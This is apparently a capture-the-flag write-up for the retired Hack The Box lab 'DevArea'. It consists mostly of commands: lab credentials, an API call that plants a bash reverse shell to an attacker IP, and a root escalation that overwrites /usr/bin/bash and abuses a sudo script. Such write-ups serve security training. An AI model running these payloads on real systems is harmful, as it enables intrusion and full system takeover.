
# DevArea

> Retired Hack The Box machine. Public copy with the challenge token and flag removed. Authorized lab use only.

Get User

```
Got the credentials: `admin` / `O7IJ27MyyXiU`

http://10.129.244.208:8888/dashboard
```

```
fetch('/api/v2/hoverfly/middleware', {

method: 'PUT',

headers: {

'Authorization': 'Bearer <REDACTED_CHALLENGE_TOKEN>',

'Content-Type': 'application/json'

},

body: JSON.stringify({

"binary": "bash",

"script": "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1"

})

}).then(r => r.json()).then(console.log)
```

Get Root

```
┌──(kali㉿kali)-[~/HTB/DevArea]
└─$ nc -lvnp 4444                                                                                                                                           
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.122.151] 60234
bash: cannot set terminal process group (1437): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$ exec sh
exec sh
ps -C bash
    PID TTY          TIME CMD
  12743 ?        00:00:00 bash
kill -9 12743
cp /bin/bash /tmp/bash_real
echo "#!/tmp/bash_real" > /usr/bin/bash
echo "sh"  >> /usr/bin/bash
sudo /opt/syswatch/syswatch.sh --version
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
[root flag removed]


```

To get root shell

```
sudo -l
exec sh
ps -C bash
kill -9 <PID>
cp /bin/bash /tmp/bash_real
echo "#!/tmp/bash_real" > /usr/bin/bash
echo "sh" >> /usr/bin/bash
sudo /opt/syswatch/syswatch.sh --version
```
